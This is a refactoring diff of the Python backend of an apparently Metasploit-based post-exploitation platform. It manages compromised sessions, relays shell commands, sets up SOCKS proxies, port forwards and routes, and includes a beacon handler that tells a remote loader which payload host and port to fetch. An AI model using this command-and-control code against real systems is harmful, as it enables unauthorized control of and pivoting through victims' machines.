-                    oneSession['available'] = False  # 是否初始化完成
-                    sessions.append(oneSession)
+                    one_session['tunnel_local'] = info.get('tunnel_local')
+                    one_session['tunnel_peer'] = info.get('tunnel_peer')
+                    one_session['via_exploit'] = info.get('via_exploit')
+                    one_session['via_payload'] = info.get('via_payload')
+                    one_session['info'] = info.get('info')
+                    one_session['arch'] = info.get('arch')
+                    one_session['platform'] = info.get('platform')
+                    one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
+                    one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
+                    one_session['advanced_info'] = {"sysinfo": {}, "username": "Initializing"}
+                    one_session['os'] = None
+                    one_session['load_powershell'] = False
+                    one_session['load_python'] = False
+                    one_session['uuid'] = info.get('uuid')
+                    one_session['routes'] = []
+                    one_session['isadmin'] = False
+                    one_session['available'] = False  # 是否初始化完成
+                    sessions.append(one_session)
                     continue
-                oneSession['type'] = info.get('type')
-                oneSession['session_host'] = info.get('session_host')
+                one_session['type'] = info.get('type')
+                one_session['session_host'] = info.get('session_host')
                 sessionhosts.append(info.get('session_host'))
-                oneSession['tunnel_local'] = info.get('tunnel_local')
-                oneSession['tunnel_peer'] = info.get('tunnel_peer')
-                oneSession['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
-                oneSession['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
-                oneSession['via_exploit'] = info.get('via_exploit')
-                oneSession['via_payload'] = info.get('via_payload')
-                oneSession['info'] = info.get('info')
-                oneSession['arch'] = info.get('arch')
-                oneSession['platform'] = info.get('platform')
-                oneSession['last_checkin'] = info.get('last_checkin') // 10 * 10
-                oneSession['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
-                oneSession['advanced_info'] = info.get('advanced_info')
+                one_session['tunnel_local'] = info.get('tunnel_local')
+                one_session['tunnel_peer'] = info.get('tunnel_peer')
+                one_session['tunnel_peer_ip'] = info.get('tunnel_peer').split(":")[0]
+                one_session['tunnel_peer_locate'] = Geoip.get_city(info.get('tunnel_peer').split(":")[0])
+                one_session['via_exploit'] = info.get('via_exploit')
+                one_session['via_payload'] = info.get('via_payload')
+                one_session['info'] = info.get('info')
+                one_session['arch'] = info.get('arch')
+                one_session['platform'] = info.get('platform')
+                one_session['last_checkin'] = info.get('last_checkin') // 10 * 10
+                one_session['fromnow'] = (int(time.time()) - info.get('last_checkin')) // 10 * 10
+                one_session['advanced_info'] = info.get('advanced_info')
                 try:
-                    oneSession['os'] = info.get('advanced_info').get("sysinfo").get("OS")
-                    oneSession['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
+                    one_session['os'] = info.get('advanced_info').get("sysinfo").get("OS")
+                    one_session['os_short'] = info.get('advanced_info').get("sysinfo").get("OS").split("(")[0]
                 except Exception as _:
-                    oneSession['os'] = None
-                    oneSession['os_short'] = None
-                oneSession['load_powershell'] = info.get('load_powershell')
-                oneSession['load_python'] = info.get('load_python')
-                oneSession['uuid'] = info.get('uuid')
+                    one_session['os'] = None
+                    one_session['os_short'] = None
+                one_session['load_powershell'] = info.get('load_powershell')
+                one_session['load_python'] = info.get('load_python')
+                one_session['uuid'] = info.get('uuid')
                 try:
-                    oneSession['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")
+                    one_session['isadmin'] = info.get('advanced_info').get("sysinfo").get("IsAdmin")
 
                     if info.get('platform').lower().startswith('linux'):
-                        if "uid=0" in oneSession['info'].lower():
-                            oneSession['isadmin'] = True
+                        if "uid=0" in one_session['info'].lower():
+                            one_session['isadmin'] = True
                 except Exception as _:
-                    oneSession['isadmin'] = None
+                    one_session['isadmin'] = None
 
                 routestrlist = info.get('routes')
 
                 try:
-                    oneSession['routes'] = []
+                    one_session['routes'] = []
                     if isinstance(routestrlist, list):
                         for routestr in routestrlist:
                             routestr.split('/')
                             tmpdict = {"subnet": routestr.split('/')[0], 'netmask': routestr.split('/')[1]}
-                            oneSession['routes'].append(tmpdict)
+                            one_session['routes'].append(tmpdict)
                 except Exception as E:
                     logger.error(E)
-                oneSession['available'] = True
+                one_session['available'] = True
                 sessions_available_count += 1
-                sessions.append(oneSession)
+                sessions.append(one_session)
 
         def split_ip(ip):
             try:
                 result = tuple(int(part) for part in ip.split('.'))
             except Exception as E:
-                return (0, 0, 0)
+                logger.exception(E)
+                return 0, 0, 0
             return result
 
         def session_host_key(item):
             return split_ip(item.get("session_host"))
 
-        try:
-            sessions = sorted(sessions, key=session_host_key)
-        except Exception as E:
-            pass
+        sessions = sorted(sessions, key=session_host_key)
 
         # session监控功能
         if Xcache.get_sessionmonitor_conf().get("flag"):
@@ -1682,11 +1678,11 @@ class SessionLib(object):
         if self._rightinfo or self._pinfo or self._uacinfo:
             cache_result = Xcache.get_session_info(self.sessionid)
             if cache_result is None:
-                type = "post"
+                module_type = "post"
                 mname = "multi/gather/session_info"
                 opts = {'SESSION': self.sessionid, 'PINFO': self._pinfo, 'RIGHTINFO': self._rightinfo,
                         'UACINFO': self._uacinfo}
-                result = MSFModule.run(type=type, mname=mname, opts=opts, timeout=30)
+                result = MSFModule.run(module_type=module_type, mname=mname, opts=opts, timeout=30)
             else:
                 result = cache_result
             if result is None:
@@ -1787,12 +1783,12 @@ class SessionLib(object):
         if self.platform == "windows":
             if self.user is not None:
                 try:
-                    sessionDomain = self.user.split('\\')[0]
-                    if sessionDomain.lower() == self.domain.lower():
+                    session_domain = self.user.split('\\')[0]
+                    if session_domain.lower() == self.domain.lower():
                         return True
-                    if sessionDomain.lower() == self.computer.lower():
+                    if session_domain.lower() == self.computer.lower():
                         return False
-                    if sessionDomain.lower() == "nt authority":  # system权限默认在域中
+                    if session_domain.lower() == "nt authority":  # system权限默认在域中
                         return True
                     return False
                 except Exception as E:
@@ -1823,12 +1819,12 @@ class SessionLib(object):
 class SessionIO(object):
 
     @staticmethod
-    def create(hid=None, sessionid=None, input=None):
+    def create(hid=None, sessionid=None, user_input=None):
         try:
-            input = input.strip()
+            user_input = user_input.strip()
 
-            if input.startswith('shell'):
-                command = input[len('shell'):]
+            if user_input.startswith('shell'):
+                command = user_input[len('shell'):]
                 if len(command) == 0:
                     new_bufer = "\n{}\n".format(
                         "Not support switch to Dos/Bash,input like\"shell whoami\" to run os cmd.")
@@ -1837,21 +1833,21 @@ class SessionIO(object):
                     context = dict_data_return(200, SessionIO_MSG.get(200), result)
                     return context
                 else:
-                    input = f"shell -c '{command}'"
+                    user_input = f"shell -c '{command}'"
 
-            if input.startswith('exit'):
+            if user_input.startswith('exit'):
                 params = [sessionid]
                 result = RpcClient.call(Method.SessionMeterpreterSessionKill, params)
 
                 context = dict_data_return(203, SessionIO_MSG.get(203), result)
                 return context
 
-            params = [sessionid, input]
+            params = [sessionid, user_input]
             result = RpcClient.call(Method.SessionMeterpreterWrite, params)
             if result is None:
                 context = dict_data_return(305, SessionIO_MSG.get(305), {})
             elif result.get('result') == 'success':
-                new_bufer = "{}{}\n".format(METERPRETER_PROMPT, input)
+                new_bufer = "{}{}\n".format(METERPRETER_PROMPT, user_input)
                 result = Xcache.add_sessionio_cache(hid, new_bufer)
                 context = dict_data_return(200, SessionIO_MSG.get(200), result)
             else:
@@ -1888,17 +1884,6 @@ class SessionIO(object):
         context = dict_data_return(204, SessionIO_MSG.get(204), result)
         return context
 
-    @staticmethod
-    def _shell_cmd(sessionid=None, command=None, args=''):
-        type = "post"
-        path = "multi/manage/execute"
-        opts = {
-            'SESSION': sessionid,
-            'COMMAND': command,
-            'ARGS': args
-        }
-        return MSFModule.run(type, path, opts)
-
 
 class Console(object):
     def __init__(self):
@@ -1913,8 +1898,8 @@ class Console(object):
         else:
             consoles = result.get("consoles")
             if len(consoles) == 0:
-                consolesCreateOpt = {"SkipDatabaseInit": True, 'AllowCommandPassthru': False}
-                result = RpcClient.call(Method.ConsoleCreate, [consolesCreateOpt])
+                consoles_create_opt = {"SkipDatabaseInit": True, 'AllowCommandPassthru': False}
+                result = RpcClient.call(Method.ConsoleCreate, [consoles_create_opt])
                 if result is None:
                     Xcache.set_console_id(None)
                     return False
@@ -1940,7 +1925,7 @@ class Console(object):
                 for console in consoles:  # 删除已知命令行
                     cid = int(console.get("id"))
                     params = [cid]
-                    result = RpcClient.call(Method.ConsoleDestroy, params)
+                    RpcClient.call(Method.ConsoleDestroy, params)
             result = RpcClient.call(Method.ConsoleCreate)
             if result is None:
                 Xcache.set_console_id(None)
@@ -2084,7 +2069,7 @@ class Route(object):
             opts = {'CMD': 'autoadd', 'SESSION': sessionid}
         else:
             opts = {'CMD': 'add', 'SUBNET': subnet, 'NETMASK': netmask, 'SESSION': sessionid}
-        result = MSFModule.run(type="post", mname="multi/manage/routeapi", opts=opts)
+        result = MSFModule.run(module_type="post", mname="multi/manage/routeapi", opts=opts)
         if result is None:
             context = list_data_return(505, CODE_MSG.get(505), [])
             return context
@@ -2112,7 +2097,7 @@ class Route(object):
     @staticmethod
     def destory(subnet=None, netmask=None, sessionid=None):
         opts = {'CMD': 'delete', 'SUBNET': subnet, 'NETMASK': netmask, 'SESSION': sessionid}
-        result = MSFModule.run(type="post", mname="multi/manage/routeapi", opts=opts)
+        result = MSFModule.run(module_type="post", mname="multi/manage/routeapi", opts=opts)
         if result is None:
             context = list_data_return(505, CODE_MSG.get(505), [])
             return context
@@ -2210,7 +2195,7 @@ class Socks(object):
                 context = dict_data_return(408, CODE_MSG.get(408), {})
                 return context
 
-            result = MSFModule.run(type="auxiliary", mname="server/socks4a_api", opts=opts, runasjob=True)
+            result = MSFModule.run(module_type="auxiliary", mname="server/socks4a_api", opts=opts, runasjob=True)
             if isinstance(result, dict) is not True or result.get('job_id') is None:
                 opts['job_id'] = None
                 context = dict_data_return(303, Socks_MSG.get(303), opts)
@@ -2232,7 +2217,7 @@ class Socks(object):
                 context = dict_data_return(408, CODE_MSG.get(408), {})
                 return context
 
-            result = MSFModule.run(type="auxiliary", mname="server/socks5_api", opts=opts, runasjob=True)
+            result = MSFModule.run(module_type="auxiliary", mname="server/socks5_api", opts=opts, runasjob=True)
             if isinstance(result, dict) is not True or result.get('job_id') is None:
                 opts['job_id'] = None
                 context = dict_data_return(303, Socks_MSG.get(303), opts)
@@ -2248,8 +2233,8 @@ class Socks(object):
             return context
 
     @staticmethod
-    def destory(type=None, jobid=None):
-        if type == "msf_socks4a":
+    def destory(socks_type=None, jobid=None):
+        if socks_type == "msf_socks4a":
             flag = Job.destroy(jobid)
             if flag:
                 if Job.is_msf_job_alive(jobid) is not True:
@@ -2260,7 +2245,7 @@ class Socks(object):
             else:
                 context = dict_data_return(304, Socks_MSG.get(304), {})
             return context
-        elif type == "msf_socks5":
+        elif socks_type == "msf_socks5":
             flag = Job.destroy(jobid)
             if flag:
                 if Job.is_msf_job_alive(jobid) is not True:
@@ -2318,7 +2303,7 @@ class PortFwd(object):
                 'LHOST': lhost, 'LPORT': lport, 'RHOST': rhost, 'RPORT': rport,
                 'SESSION': sessionid, 'CMD': 'add'}
 
-        result = MSFModule.run(type="post", mname="multi/manage/portfwd_api", opts=opts)
+        result = MSFModule.run(module_type="post", mname="multi/manage/portfwd_api", opts=opts)
         if result is None:
             context = dict_data_return(308, PORTFWD_MSG.get(308), {})
             return context
@@ -2341,7 +2326,7 @@ class PortFwd(object):
         if sessionid is not None or sessionid == -1:
             opts = {'TYPE': portfwdtype, 'LHOST': lhost, 'LPORT': lport, 'RHOST': rhost, 'RPORT': rport,
                     'SESSION': sessionid, 'CMD': 'delete'}
-            result = MSFModule.run(type="post", mname="multi/manage/portfwd_api", opts=opts)
+            result = MSFModule.run(module_type="post", mname="multi/manage/portfwd_api", opts=opts)
             if result is None:
                 context = dict_data_return(308, PORTFWD_MSG.get(308), {})
                 return context
@@ -2363,14 +2348,14 @@ class PortFwd(object):
             return context
 
     @staticmethod
-    def _check_host_port(type=None, lhost=None, lport=None, rhost=None, rport=None):
-        if type not in ['Reverse', 'Forward']:
+    def _check_host_port(portfwd_type=None, lhost=None, lport=None, rhost=None, rport=None):
+        if portfwd_type not in ['Reverse', 'Forward']:
             context = dict_data_return(306, PORTFWD_MSG.get(306), {})
             return False, context
         if lport is None or rport is None:
             context = dict_data_return(306, PORTFWD_MSG.get(306), {})
             return False, context
-        if type == "Reverse":
+        if portfwd_type == "Reverse":
             if lhost is None:
                 context = dict_data_return(306, PORTFWD_MSG.get(306), {})
                 return False, context
@@ -2412,7 +2397,7 @@ class Transport(object):
             i = 0
             for transport in transports:
                 transport["tid"] = i
-                i = i + 1
+                i += 1
                 if transport.get("url") == current_transport_url:
                     transport["active"] = True
 
@@ -2420,10 +2405,10 @@ class Transport(object):
                     cert_hash = transport.get("cert_hash")
                     transport["cert_hash"] = base64.b64encode(cert_hash.encode("utf-8"))
 
-            def sort_by_url(transport):
-                return transport.get("url")
+            def get_url(data):
+                return data.get("url")
 
-            transports.sort(key=sort_by_url)
+            transports.sort(key=get_url)
             return result_list
 
     @staticmethod
@@ -2571,7 +2556,7 @@ class FileMsf(object):
         if filename is None:  # 列出所有文件
             result = FileMsf.list_msf_files()
             for one in result:
-                one['format_size'] = FileSession.getSizeInNiceString(one.get('size'))
+                one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))
 
             def sort_files(a, b):
                 if a['mtime'] < b['mtime']:
@@ -2695,7 +2680,7 @@ class FileMsf(object):
     @staticmethod
     def encrypt_file_name(filename):
         key = Xcache.get_aes_key()
-        pr = aescrypt(key, 'ECB', '', 'utf-8')
+        pr = Aescrypt(key, 'ECB', '', 'utf-8')
         en_text = pr.aesencrypt(filename)
         en_text_url = parse.quote(en_text)
         return en_text_url
@@ -2703,13 +2688,14 @@ class FileMsf(object):
     @staticmethod
     def decrypt_file_name(enfilename):
         key = Xcache.get_aes_key()
-        pr = aescrypt(key, 'ECB', '', 'utf-8')
+        pr = Aescrypt(key, 'ECB', '', 'utf-8')
         try:
             enfilename_url = parse.unquote(enfilename)
             filename = pr.aesdecrypt(enfilename_url)
 
             return filename
         except Exception as E:
+            logger.exception(E)
             return None
 
     @staticmethod
@@ -2759,11 +2745,11 @@ class FileSession(object):
 
                     if one.get('total_space') is not None and one.get('free_space') is not None:
                         use_space = one.get('total_space') - one.get('free_space')
-                        one['format_size'] = FileSession.getSizeInNiceString(use_space)
-                        one['format_mode'] = '{}|{}'.format(FileSession.getSizeInNiceString(one.get('free_space')),
-                                                            FileSession.getSizeInNiceString(one.get('total_space')))
+                        one['format_size'] = FileSession.get_size_in_nice_string(use_space)
+                        one['format_mode'] = '{}|{}'.format(FileSession.get_size_in_nice_string(one.get('free_space')),
+                                                            FileSession.get_size_in_nice_string(one.get('total_space')))
                     else:
-                        one['format_size'] = FileSession.getSizeInNiceString(one.get('size'))
+                        one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))
 
                     if one.get('size') is None or one.get('size') >= 1024 * 100:
                         one['cat_able'] = False
@@ -2801,7 +2787,7 @@ class FileSession(object):
                 entries = data.get('entries')
                 path = data.get('path')
                 for one in entries:
-                    one['format_size'] = FileSession.getSizeInNiceString(one.get('size'))
+                    one['format_size'] = FileSession.get_size_in_nice_string(one.get('size'))
                     if one.get('size') >= 1024 * 100:
                         one['cat_able'] = False
                     else:
@@ -2913,7 +2899,8 @@ class FileSession(object):
             else:
                 context = list_data_return(201, FileSession_MSG.get(201), result.get('data'))
                 return context
-        elif operation == 'upload_file' and sessionid is not None and filename is not None and dirpath is not None:  # 上传文件
+        # 上传文件
+        elif operation == 'upload_file' and sessionid is not None and filename is not None and dirpath is not None:
             formatdir = FileSession.deal_path(dirpath)
             opts = {'OPERATION': 'upload', 'SESSION': sessionid, 'SESSION_DIR': formatdir, 'MSF_FILE': filename}
             result = MSFModule.run('post', 'multi/manage/file_system_operation_api', opts, runasjob=True, timeout=12)
@@ -2982,24 +2969,24 @@ class FileSession(object):
             return context
 
     @staticmethod
-    def getSizeInNiceString(sizeInBytes=None):
+    def get_size_in_nice_string(size_in_bytes=None):
         """
         Convert the given byteCount into a string like: 9.9bytes/KB/MB/GB
         """
-        if sizeInBytes is None:
-            sizeInBytes = 0
+        if size_in_bytes is None:
+            size_in_bytes = 0
         for (cutoff, label) in [(1024 * 1024 * 1024, "GB"),
                                 (1024 * 1024, "MB"),
                                 (1024, "KB"),
                                 ]:
-            if sizeInBytes >= cutoff:
-                return "%.1f %s" % (sizeInBytes * 1.0 / cutoff, label)
+            if size_in_bytes >= cutoff:
+                return "%.1f %s" % (size_in_bytes * 1.0 / cutoff, label)
 
-        if sizeInBytes == 1:
+        if size_in_bytes == 1:
             return "1 B"
         else:
-            bytes = "%.1f" % (sizeInBytes or 0,)
-            return (bytes[:-2] if bytes.endswith('.0') else bytes) + ' B'
+            bytes_str = "%.1f" % (size_in_bytes or 0,)
+            return (bytes_str[:-2] if bytes_str.endswith('.0') else bytes_str) + ' B'
 
     @staticmethod
     def deal_path(path=None):
@@ -3082,11 +3069,11 @@ class LazyLoader(object):
         return context
 
     @staticmethod
-    def sourceCode():
+    def source_code():
 
         filename = "lazyloader.zip"
-        lazyloaderSourceCodePath = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, filename)
-        byteresult = FileWrapper(open(lazyloaderSourceCodePath, 'rb'), blksize=1024)
+        lazyloader_source_code_path = os.path.join(settings.BASE_DIR, STATIC_STORE_PATH, filename)
+        byteresult = FileWrapper(open(lazyloader_source_code_path, 'rb'), blksize=1024)
         response = HttpResponse(byteresult)
         response['Content-Type'] = 'application/octet-stream'
         response['Code'] = 200
@@ -3136,20 +3123,20 @@ class LazyLoader(object):
             "send_payload": False,  # 是否向loader发送了payload
             "exit_loop": False,
         }
-        SLEEP = "S"
-        RUN = "R"
-        EXIT = "E"
-        NULL = "N"
+        sleep_cmd = "S"
+        run_cmd = "R"
+        exit_cmd = "E"
+        null_cmd = "N"
         if loader_uuid is None:  # 首次请求
             if req == "u":
                 loader_uuid = str(uuid.uuid1()).replace('-', "")[0:16]
                 context = f"{loader_uuid}"
             else:
-                context = f"{NULL}"
+                context = f"{null_cmd}"
             return context
         else:
             if len(loader_uuid) != 16:  # 检查uuid
-                context = f"{NULL}"
+                context = f"{null_cmd}"
                 return context
             if req == "h":  # 心跳请求
                 lazyloader = Xcache.get_lazyloader_by_uuid(loader_uuid)
@@ -3158,12 +3145,12 @@ class LazyLoader(object):
                     empty_lazyloader["ipaddress"] = ipaddress
                     empty_lazyloader["last_check"] = int(time.time())
                     Xcache.set_lazyloader_by_uuid(loader_uuid, empty_lazyloader)
-                    context = f"{SLEEP}"
+                    context = f"{sleep_cmd}"
                     return context
                 else:
                     if lazyloader.get("exit_loop") is True:  # 退出循环
                         Xcache.del_lazyloader_by_uuid(loader_uuid)
-                        context = f"{EXIT}"
+                        context = f"{exit_cmd}"
                         return context
 
                     new_interval = int(time.time()) - lazyloader.get("last_check")  # 获取新间隔
@@ -3173,22 +3160,22 @@ class LazyLoader(object):
                     lazyloader["last_check"] = int(time.time())  # 更新最后心跳
                     lazyloader["ipaddress"] = ipaddress  # 更新对端地址
 
-                    if lazyloader["payload"] is not None and lazyloader["send_payload"] == False:  # 发送payload
+                    if lazyloader["payload"] is not None and lazyloader["send_payload"] is False:  # 发送payload
                         # 获取payload配置
                         payload = lazyloader.get("payload")
-                        LHOST = payload.get("LHOST")
-                        LPORT = payload.get("LPORT")
-                        LURI = payload.get("LURI")
+                        lhost = payload.get("LHOST")
+                        lport = payload.get("LPORT")
+                        luri = payload.get("LURI")
 
                         lazyloader["send_payload"] = True
 
-                        context = f"{RUN}-{LHOST}-{LPORT}-{LURI}"
+                        context = f"{run_cmd}-{lhost}-{lport}-{luri}"
                     else:
-                        context = f"{SLEEP}"
+                        context = f"{sleep_cmd}"
                     Xcache.set_lazyloader_by_uuid(loader_uuid, lazyloader)
                     return context
             else:
-                context = f"{NULL}"
+                context = f"{null_cmd}"
                 return context
 
 
@@ -3242,9 +3229,9 @@ class Mingw(object):
             cmd.append("-fno-asynchronous-unwind-tables")
             link_options = '-Wl,' + '--no-seh,'
             if self.strip_syms:
-                link_options = link_options + '-s'
+                link_options += '-s'
             if self.link_script:
-                link_options = link_options + f",-T{self.link_script}"
+                link_options += f",-T{self.link_script}"
             cmd.append(link_options)
         return cmd
 
@@ -3270,16 +3257,17 @@ class Mingw(object):
         try:
             os.remove(src_file)
         except Exception as E:
-            pass
+            logger.exception(E)
+
         try:
             os.remove(exe_file)
         except Exception as E:
-            pass
+            logger.exception(E)
 
 
 class MainMonitor(object):
     def __init__(self):
-        pass
+        self.MainScheduler = BackgroundScheduler()
 
     def start(self):
         try:
@@ -3295,7 +3283,7 @@ class MainMonitor(object):
         Xcache.init_xcache_on_start()
         # 加载模块配置信息
         from PostModule.postmodule import PostModuleConfig
-        modulecount = PostModuleConfig._load_all_modules_config()
+        PostModuleConfig.load_all_modules_config()
 
         # 关闭apscheduler的警告
         log = logging.getLogger('apscheduler.scheduler')
@@ -3358,10 +3346,8 @@ class MainMonitor(object):
         broker = req.get("broker")
         module_intent = req.get("module")
         if broker == BROKER.bot_msf_job:
-            # 补齐post模块缺失的参数
-
             # 放入后台运行队列
-            flag = MSFModule.putin_post_msf_module_queue(module_intent)
+            MSFModule.putin_post_msf_module_queue(module_intent)
         else:
             logger.error("unknow broker")
 
